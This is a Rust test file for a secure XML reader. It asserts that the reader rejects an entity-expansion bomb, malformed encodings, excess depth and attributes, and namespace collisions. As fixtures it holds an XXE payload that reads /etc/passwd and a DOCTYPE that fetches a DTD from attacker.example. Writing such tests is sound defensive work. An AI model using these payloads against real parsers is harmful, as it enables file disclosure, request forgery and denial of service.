//! Adversarial tests for the secure XML reader.

use super::*;

fn check(src: &str) -> Result<u64, XmlError> {
    validate_document(src, XmlLimits::default())
}

#[test]
fn billion_laughs_is_refused_at_the_doctype() {
    let bomb = r#"<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol9 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol9;</lolz>"#;
    assert_eq!(check(bomb), Err(XmlError::DoctypeForbidden));
}

#[test]
fn xxe_is_refused() {
    let xxe =
        r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>"#;
    assert_eq!(check(xxe), Err(XmlError::DoctypeForbidden));
    let ssrf = r#"<!DOCTYPE r SYSTEM "http://attacker.example/evil.dtd"><r/>"#;
    assert_eq!(check(ssrf), Err(XmlError::DoctypeForbidden));
}

#[test]
fn undeclared_entities_are_refused_even_without_doctype() {
    assert!(matches!(check("<r>&evil;</r>"), Err(XmlError::UndefinedEntity(_))));
    assert!(check(r#"<r a="&evil;"/>"#).is_err());
}

#[test]
fn predefined_entities_and_char_refs_are_fine() {
    let src = r#"<r a="&lt;&#x41;">&amp;&lt;&gt;&apos;&quot;&#1055;&#x420;</r>"#;
    assert!(check(src).is_ok());
    let mut r = SecureXmlReader::new(src, XmlLimits::default()).unwrap();
    let mut text = String::new();
    while let Some(item) = r.next_item().unwrap() {
        push_text(&item.event, &mut text);
        if let Event::Start(e) = &item.event {
            assert_eq!(attr(e, "a").as_deref(), Some("<A"));
        }
    }
    assert_eq!(text, "&<>'\"ПР");
}

#[test]
fn invalid_char_ref_is_refused() {
    assert!(check("<r>&#0;</r>").is_err());
    assert!(check("<r>&#xD800;</r>").is_err());
}

#[test]
fn depth_64_is_allowed_65_is_not() {
    let nest = |n: usize| format!("{}{}", "<a>".repeat(n), "</a>".repeat(n));
    assert!(check(&nest(64)).is_ok());
    assert_eq!(check(&nest(65)), Err(XmlError::DepthExceeded(64)));
    // An empty element at depth 65 counts too.
    let deep_empty = format!("{}<b/>{}", "<a>".repeat(64), "</a>".repeat(64));
    assert_eq!(check(&deep_empty), Err(XmlError::DepthExceeded(64)));
}

#[test]
fn attribute_limits_and_duplicates() {
    let many: String = (0..600).map(|i| format!(" a{i}=\"1\"")).collect();
    assert_eq!(check(&format!("<r{many}/>")), Err(XmlError::TooManyAttributes(512)));
    assert!(matches!(check(r#"<r a="1" a="2"/>"#), Err(XmlError::Malformed(_))));
}

#[test]
fn duplicate_attributes_are_found_wherever_they_sit() {
    // Inside the stack-tracked prefix, across the boundary, and in the spill area.
    for (first, second) in [(0, 1), (0, 15), (15, 16), (3, 40), (20, 500), (16, 17)] {
        let attrs: String = (0..=second.max(first) + 1)
            .map(|i| {
                let name = if i == second { first } else { i };
                format!(" a{name}=\"1\"")
            })
            .collect();
        assert!(
            matches!(check(&format!("<r{attrs}/>")), Err(XmlError::Malformed(_))),
            "duplicate of attribute {first} at position {second} went unnoticed"
        );
    }
    // 17 distinct attributes are fine, and the same names on different elements too.
    let ok: String = (0..17).map(|i| format!(" a{i}=\"1\"")).collect();
    assert!(check(&format!("<r{ok}><c{ok}/><c{ok}/></r>")).is_ok());
    // Prefixed names that differ only by prefix are distinct attributes.
    assert!(check(r#"<r xmlns:p="u" xmlns:q="v" p:a="1" q:a="2" a="3"/>"#).is_ok());
}

#[test]
fn names_are_split_at_the_last_colon() {
    let mut reader = SecureXmlReader::new(r#"<w:p><a:b:c/></w:p>"#, XmlLimits::default()).unwrap();
    let mut locals = Vec::new();
    while let Some(item) = reader.next_item().unwrap() {
        if let Event::Start(e) | Event::Empty(e) = &item.event {
            locals.push(local_name(e).to_owned());
        }
    }
    assert_eq!(locals, ["p", "c"]);
    assert_eq!(split_qname("w:p"), (Some("w"), "p"));
    assert_eq!(split_qname("plain"), (None, "plain"));
    assert_eq!(split_qname(":x"), (Some(""), "x"));
    assert_eq!(split_qname("a:b:c"), (Some("a"), "b:c"));
}

#[test]
fn single_root_rule() {
    assert_eq!(check("<a/><b/>"), Err(XmlError::ContentAfterRoot));
    assert_eq!(check("<a></a><b/>"), Err(XmlError::ContentAfterRoot));
    assert_eq!(check("<a/>trailing"), Err(XmlError::ContentAfterRoot));
    assert_eq!(check("  "), Err(XmlError::NoRoot));
    assert!(check("<?xml version=\"1.0\"?>\n<!-- c --><a/>\n<!-- c -->\n").is_ok());
}

#[test]
fn mismatched_tags_are_malformed() {
    assert!(matches!(check("<a><b></a></b>"), Err(XmlError::Malformed(_))));
    assert!(matches!(check("<a>"), Err(XmlError::Malformed(_))));
}

#[test]
fn event_limit() {
    let src = format!("<r>{}</r>", "<x/>".repeat(100));
    let limits = XmlLimits { max_events: 50, ..XmlLimits::default() };
    assert_eq!(validate_document(&src, limits), Err(XmlError::TooManyEvents(50)));
}

#[test]
fn encodings() {
    let limits = XmlLimits::default();
    let utf8_bom = b"\xEF\xBB\xBF<r>\xD0\x9F</r>";
    assert_eq!(decode_xml_bytes(utf8_bom, &limits).unwrap(), "<r>П</r>");
    let mut utf16le = vec![0xFF, 0xFE];
    for u in "<r>П</r>".encode_utf16() {
        utf16le.extend_from_slice(&u.to_le_bytes());
    }
    assert_eq!(decode_xml_bytes(&utf16le, &limits).unwrap(), "<r>П</r>");
    let mut utf16be = vec![0xFE, 0xFF];
    for u in "<r/>".encode_utf16() {
        utf16be.extend_from_slice(&u.to_be_bytes());
    }
    assert_eq!(decode_xml_bytes(&utf16be, &limits).unwrap(), "<r/>");
    assert!(decode_xml_bytes(b"<r>\xC3\x28</r>", &limits).is_err());
    assert!(decode_xml_bytes(&[0xFF, 0xFE, 0x00], &limits).is_err());
}

#[test]
fn spans_cover_the_whole_input() {
    let src =
        "<?xml version=\"1.0\"?>\n<a x=\"1\"><b>t&amp;u</b><![CDATA[c]]><!--k--><?pi d?></a>\n";
    let mut r = SecureXmlReader::new(src, XmlLimits::default()).unwrap();
    let mut rebuilt = String::new();
    while let Some(item) = r.next_item().unwrap() {
        rebuilt.push_str(src.get(item.span.clone()).unwrap());
    }
    assert_eq!(rebuilt, src);
}

#[test]
fn local_names_and_attrs() {
    let src = r#"<w:r xmlns:w="urn:w" w:val="X" r:id="rId1"/>"#;
    let mut r = SecureXmlReader::new(src, XmlLimits::default()).unwrap();
    let item = r.next_item().unwrap().unwrap();
    let Event::Empty(e) = &item.event else { panic!("expected empty element") };
    assert_eq!(local_name(e), "r");
    assert_eq!(attr(e, "val").as_deref(), Some("X"));
    assert_eq!(attr_q(e, "r:id").as_deref(), Some("rId1"));
    assert_eq!(attrs(e).len(), 3);
    assert_eq!(escape("<a&'\">"), "&lt;a&amp;&apos;&quot;&gt;");
}

fn utf16_bytes(text: &str, bom: Option<[u8; 2]>, big_endian: bool) -> Vec<u8> {
    let mut out: Vec<u8> = bom.map(Vec::from).unwrap_or_default();
    for u in text.encode_utf16() {
        out.extend_from_slice(&if big_endian { u.to_be_bytes() } else { u.to_le_bytes() });
    }
    out
}

#[test]
fn utf16_and_utf32_without_a_byte_order_mark_are_refused() {
    let limits = XmlLimits::default();
    let doc = "<r>hello</r>";
    // A reader that sniffs sees a document; one that does not sees "<\0r\0>\0...".
    for big_endian in [false, true] {
        let bytes = utf16_bytes(doc, None, big_endian);
        assert!(
            matches!(decode_xml_bytes(&bytes, &limits), Err(XmlError::Encoding(_))),
            "big_endian={big_endian}"
        );
    }
    // With a declaration first (still no mark), and with leading white space.
    let declared = utf16_bytes("<?xml version=\"1.0\"?><r/>", None, false);
    assert!(decode_xml_bytes(&declared, &limits).is_err());
    let spaced = utf16_bytes(" <r/>", None, false);
    assert!(decode_xml_bytes(&spaced, &limits).is_err());
    // UTF-32 with and without a mark.
    for utf32 in [
        &[0x00u8, 0x00, 0xFE, 0xFF, 0, 0, 0, b'<'][..],
        &[0xFF, 0xFE, 0x00, 0x00, b'<', 0, 0, 0][..],
        &[0x00, 0x00, 0x00, b'<', 0, 0, 0, b'r'][..],
        &[b'<', 0x00, 0x00, 0x00, b'r', 0, 0, 0][..],
    ] {
        assert!(decode_xml_bytes(utf32, &limits).is_err(), "{utf32:?}");
    }
    // EBCDIC "<?xml".
    assert!(decode_xml_bytes(&[0x4C, 0x6F, 0xA7, 0x94, 0x93, 0x40], &limits).is_err());
}

#[test]
fn characters_outside_the_xml_char_production_are_refused() {
    let limits = XmlLimits::default();
    for bad in [
        "<r>a\u{0}b</r>",
        "<r>a\u{1}b</r>",
        "<r>a\u{B}b</r>",
        "<r>a\u{1F}b</r>",
        "<r>\u{FFFE}</r>",
        "<r>\u{FFFF}</r>",
    ] {
        assert!(
            matches!(decode_xml_bytes(bad.as_bytes(), &limits), Err(XmlError::Encoding(_))),
            "{bad:?}"
        );
        // The parser refuses them too, for callers that hold a string already.
        assert!(matches!(check(bad), Err(XmlError::Encoding(_))), "{bad:?}");
    }
    // Tab, line feed, carriage return, DEL, C1 controls and ordinary non-ASCII are Chars.
    assert!(check("<r>a\tb\nc\r\n\u{7F}\u{85}\u{FFFD}\u{10000}</r>").is_ok());
    // Through UTF-16 as well.
    let bytes = utf16_bytes("<r>a\u{0}b</r>", Some([0xFF, 0xFE]), false);
    assert!(matches!(decode_xml_bytes(&bytes, &limits), Err(XmlError::Encoding(_))));
}

#[test]
fn the_declared_encoding_must_match_the_bytes() {
    let limits = XmlLimits::default();
    for ok in [
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?><r/>",
        "<?xml version='1.0' encoding='utf-8' standalone='yes'?><r/>",
        "<?xml version=\"1.0\"?><r/>",
        "<r/>",
        "<?xml-stylesheet encoding=\"latin1\"?><r/>",
    ] {
        assert!(decode_xml_bytes(ok.as_bytes(), &limits).is_ok(), "{ok}");
    }
    for bad in [
        "<?xml version=\"1.0\" encoding=\"UTF-16\"?><r/>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><r/>",
        "<?xml version=\"1.0\" encoding=\"UTF-7\"?><r/>",
        "<?xml version=\"1.0\" encoding = 'shift_jis' ?><r/>",
    ] {
        assert!(
            matches!(decode_xml_bytes(bad.as_bytes(), &limits), Err(XmlError::Encoding(_))),
            "{bad}"
        );
    }
    // The first quoted value is not the encoding just because it is called that.
    let tricky = "<?xml version=\"encoding\" encoding=\"utf-16\"?><r/>";
    assert!(decode_xml_bytes(tricky.as_bytes(), &limits).is_err());
    // UTF-16 with a mark: "UTF-16" fits, "UTF-8" does not.
    let utf16 = |decl: &str, big_endian: bool| {
        let bom = if big_endian { [0xFE, 0xFF] } else { [0xFF, 0xFE] };
        utf16_bytes(
            &format!("<?xml version=\"1.0\" encoding=\"{decl}\"?><r/>"),
            Some(bom),
            big_endian,
        )
    };
    assert!(decode_xml_bytes(&utf16("UTF-16", false), &limits).is_ok());
    assert!(decode_xml_bytes(&utf16("utf-16le", false), &limits).is_ok());
    assert!(decode_xml_bytes(&utf16("UTF-16BE", true), &limits).is_ok());
    assert!(decode_xml_bytes(&utf16("UTF-16BE", false), &limits).is_err());
    assert!(decode_xml_bytes(&utf16("UTF-8", false), &limits).is_err());
}

#[test]
fn declare_utf8_rewrites_only_a_foreign_declaration() {
    assert_eq!(
        declare_utf8("<?xml version=\"1.0\" encoding=\"UTF-16\" standalone=\"yes\"?><r/>"),
        "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><r/>"
    );
    assert_eq!(declared_encoding("<?xml version='1.0' encoding='utf-16'?><r/>"), Some("utf-16"));
    for unchanged in
        ["<r/>", "<?xml version=\"1.0\"?><r/>", "<?xml version=\"1.0\" encoding=\"utf-8\"?><r/>"]
    {
        assert_eq!(declare_utf8(unchanged), unchanged);
    }
}

#[test]
fn many_attributes_with_a_duplicate_at_the_end_are_found() {
    let mut attrs: String = (0..500).map(|i| format!(" a{i}=\"1\"")).collect();
    attrs.push_str(" a499=\"2\"");
    assert!(matches!(check(&format!("<r{attrs}/>")), Err(XmlError::Malformed(_))));
    let distinct: String = (0..500).map(|i| format!(" a{i}=\"1\"")).collect();
    assert!(check(&format!("<r{distinct}/>")).is_ok());
}

fn element<'a>(r: &mut SecureXmlReader<'a>) -> BytesStart<'a> {
    match r.next_item().unwrap().unwrap().event {
        Event::Start(e) | Event::Empty(e) => e,
        other => panic!("unexpected event {other:?}"),
    }
}

#[test]
fn namespace_aware_lookup_reports_same_name_collisions() {
    let find = |src: &str, prefix: Option<&str>, local: &str| {
        let mut r = SecureXmlReader::new(src, XmlLimits::default()).unwrap();
        attr_ns(&element(&mut r), prefix, local)
    };
    // Only the expected one.
    assert_eq!(
        find(r#"<f xmlns:w="u" w:instr="DDE"/>"#, Some("w"), "instr"),
        AttrLookup::Found("DDE".into())
    );
    assert_eq!(find(r#"<f Target="a"/>"#, None, "Target"), AttrLookup::Found("a".into()));
    assert_eq!(find(r#"<f Target="a"/>"#, None, "Missing"), AttrLookup::Absent);
    // Another prefix alone: reported as such, not silently taken for the right one.
    assert_eq!(
        find(r#"<f xmlns:foo="v" foo:instr="x"/>"#, Some("w"), "instr"),
        AttrLookup::OtherPrefix("x".into())
    );
    // Both: the first-match `attr` would answer "x" here, the expected one says "DDE".
    let both = r#"<f xmlns:w="u" xmlns:foo="v" foo:instr="x" w:instr="DDE"/>"#;
    assert_eq!(
        find(both, Some("w"), "instr"),
        AttrLookup::Collision { preferred: Some("DDE".into()) }
    );
    let mut r = SecureXmlReader::new(both, XmlLimits::default()).unwrap();
    assert_eq!(attr(&element(&mut r), "instr").as_deref(), Some("x"));
    // Prefixed and unprefixed (`a:Target` next to `Target`) collide as well.
    assert_eq!(
        find(r#"<Relationship xmlns:a="u" a:Target="evil" Target="good"/>"#, None, "Target"),
        AttrLookup::Collision { preferred: Some("good".into()) }
    );
    assert_eq!(
        find(r#"<f xmlns:a="u" xmlns:b="v" a:x="1" b:x="2"/>"#, Some("w"), "x"),
        AttrLookup::Collision { preferred: None }
    );
}
